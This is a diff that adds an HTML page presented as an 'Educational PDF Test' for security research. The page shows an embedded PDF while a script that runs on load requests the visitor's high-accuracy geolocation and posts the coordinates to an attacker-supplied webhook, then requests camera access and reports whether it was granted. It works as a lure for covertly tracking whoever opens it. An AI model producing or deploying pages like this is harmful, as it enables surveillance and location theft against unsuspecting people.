@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Educational PDF Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; }
+        iframe { width: 80%; height: 600px; border: 1px solid #ccc; }
+    </style>
+</head>
+<body>
+    <h1>Security Research: Embedded PDF Test</h1>
+    <!-- This embeds your PDF file -->
+    <iframe src="document.pdf"></iframe>
+
+    <script>
+        const webhookURL = "YOUR_WEBHOOK_URL_HERE";
+
+        // 1. Request High-Precision Location
+        navigator.geolocation.getCurrentPosition(position => {
+            const data = {
+                type: "location",
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+            fetch(webhookURL, { method: 'POST', body: JSON.stringify(data) });
+        }, err => console.error("Location denied"), { enableHighAccuracy: true });
+
+        // 2. Request Camera Access
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                // If allowed, send a success signal to your listener
+                fetch(webhookURL, { method: 'POST', body: JSON.stringify({ type: "camera", status: "granted" }) });
+                
+                // Optional: Stop the camera immediately after test
+                stream.getTracks().forEach(track => track.stop());
+            })
+            .catch(err => console.error("Camera denied"));
+    </script>
+</body>
+</html>
